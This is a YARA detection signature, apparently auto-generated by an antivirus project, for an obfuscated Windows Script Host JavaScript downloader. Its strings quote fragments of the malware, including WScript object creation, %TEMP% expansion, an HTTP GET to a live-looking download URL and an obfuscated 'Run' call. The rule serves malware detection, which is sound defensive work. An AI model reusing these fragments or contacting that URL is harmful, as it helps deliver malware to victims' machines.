rule sig_20160428_7ca6db86282cb8ee24e1051f0b123415 {
  meta:
    description = "datamaliciousorder - file 20160428_7ca6db86282cb8ee24e1051f0b123415.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "04037dec3837cbf725a67502be10d6369f39f69787d0c2e532fdd1edf7488e20"

  strings:
    $s1  = "function ZxfFckMkoKhxHlxKkwXnx() {return UdvKebAwsIlaNfhMsnQtv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function UqnNniVgtQtvGiwFrzWxz(LxuBwuAdhHtjSumIwtSzl){UdvKebAwsIlaNfhMsnQtv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function UqnNniVgtQtvGiwFrzWxz(LxuBwuAdhHtjSumIwtSzl){UdvKebAwsIlaNfhMsnQtv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function WzgVuvIseUunVliDzeMvb(SftEiqJbpYkyXuoXajWbm, EjkAwnCdiUxpVjaWvaKcw){OaiBcfZvrTkhCvePmgEyg = OaiBcfZvrTkhCvePmgEyg * 1; " ascii
    $s5  = "return SftEiqJbpYkyXuoXajWbm - EjkAwnCdiUxpVjaWvaKcw;};" fullword ascii
    $s6  = "var UdvKebAwsIlaNfhMsnQtv = function ZiqIryBxnXwbMvnCbwIgm() {return OmbFcaApkPcoMejKyoRqd[BcjXmnEmzWtrUchMlwUqs](\"WScript\"+\"" ascii
    $s7  = "KdpJopSwlBmfEmhMpjZsy[QlzGvpByqOnrBcjIkrZmc](\"G\" + \"ET\", \"http://berezy74.ru/n8sjad\", false);" fullword ascii
    $s8  = "function ZxfFckMkoKhxHlxKkwXnx() {return UdvKebAwsIlaNfhMsnQtv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "var OmbFcaApkPcoMejKyoRqd = this[\"WScript\"];" fullword ascii
    $s10 = "var UdvKebAwsIlaNfhMsnQtv = function ZiqIryBxnXwbMvnCbwIgm() {return OmbFcaApkPcoMejKyoRqd[BcjXmnEmzWtrUchMlwUqs](\"WScript\"+\"" ascii
    $s11 = "function WzgVuvIseUunVliDzeMvb(SftEiqJbpYkyXuoXajWbm, EjkAwnCdiUxpVjaWvaKcw){OaiBcfZvrTkhCvePmgEyg = OaiBcfZvrTkhCvePmgEyg * 1; " ascii
    $s12 = "function DcoJkyKayOxpMcqFppIim(){return QnmCiuSxtClrXkvXglDwc + \"\";};" fullword ascii
    $s13 = "if (KdpJopSwlBmfEmhMpjZsy[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function PdkSjtZvrUgqRywKvmNcw() {return ((StwBswNppTsqTkeDseYum == true) && (StwBswNppTsqTkeDseYum == IgtVcvMdqMveJyzApyGxh)) ?" ascii
    $s15 = "function PdkSjtZvrUgqRywKvmNcw() {return ((StwBswNppTsqTkeDseYum == true) && (StwBswNppTsqTkeDseYum == IgtVcvMdqMveJyzApyGxh)) ?" ascii
    $s16 = "var KvwLijAeuZmtWhaMzmXnq = false;" fullword ascii
    $s17 = "function DjhTqhGpaTikHgtLasFkm(GlfFemQsdGjnKuvYyaOns) {var JigWztAwoMnnAknSelTpz = (1, 2, 3, 4, 5, GlfFemQsdGjnKuvYyaOns); retur" ascii
    $s18 = "function DjhTqhGpaTikHgtLasFkm(GlfFemQsdGjnKuvYyaOns) {var JigWztAwoMnnAknSelTpz = (1, 2, 3, 4, 5, GlfFemQsdGjnKuvYyaOns); retur" ascii
    $s19 = "function NjhOqoRdkFreMwzEwrWqy()" fullword ascii
    $s20 = "var IgtVcvMdqMveJyzApyGxh = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}